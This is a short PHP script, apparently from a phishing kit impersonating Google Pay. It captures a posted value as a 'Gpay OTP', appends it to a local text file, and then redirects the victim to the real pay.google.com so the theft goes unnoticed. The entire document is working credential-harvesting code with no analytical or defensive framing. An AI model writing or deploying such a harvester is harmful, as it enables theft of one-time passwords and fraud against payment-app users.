<?php
file_put_contents("otp.txt", "Gpay OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://pay.google.com/');
?>
